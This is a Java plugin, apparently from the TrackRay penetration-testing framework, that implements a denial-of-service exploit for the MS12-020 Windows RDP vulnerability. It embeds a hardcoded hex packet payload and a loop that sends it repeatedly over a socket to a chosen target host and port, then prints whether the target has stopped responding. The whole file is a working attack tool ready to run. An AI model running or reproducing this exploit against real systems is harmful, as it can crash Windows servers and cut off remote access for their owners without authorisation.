package com.trackray.module.plugin.windows.rdp;

import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.WebSocketPlugin;
import org.javaweb.core.utils.HexUtils;

import java.io.OutputStream;
import java.net.Socket;
import java.util.Map;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/5/20 13:32
 */
@Rule(websocket = true , sync = true, params =
        {
                @Param(key = "rhost", desc = "目标主机IP"),
                @Param(key = "rport", defaultValue = "3389",desc = "rdp端口"),
                @Param(key = "count" , defaultValue = "3", desc = "dos次数")
        }
)
@Plugin(title = "MS12020 RDP DOS" , author = "浅蓝")
public class MS12020 extends WebSocketPlugin {
    @Override
    public boolean check(Map param) {
        return !param.isEmpty();
    }

    public static String exp = "030000130ee000000000000100080000000000030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c00300000c02f08004010001000300000802f080280300000c02f08038000603ef0300000c02f08038000603eb0300000c02f08038000603ec0300000c02f08038000603ed0300000c02f08038000603ee0300000b06d00000123400";

    @Override
    public Object start() {

        int count = Integer.parseInt(param.get("count").toString());
        String rhost = param.get("rhost").toString();
        int rport = Integer.parseInt(param.get("rport").toString());
        int max = 0;
        for (int i = 0; i < count; i++) {
            max = i;
            try {
                byte[] bytes = HexUtils.hex2Bytes(exp);

                Socket socket = new Socket(rhost, rport);

                socket.setSoTimeout(3);

                OutputStream out = socket.getOutputStream();

                out.write(bytes);

                out.flush();
                out.close();
                socket.close();

                println("第"+i+"次请求已发送");

            }catch (Exception e){
                if (max == 0){
                    println("可能不存在漏洞");
                }else{
                    println("主机已拒绝服务");
                }
                break;
            }
        }

        return null;
    }
}
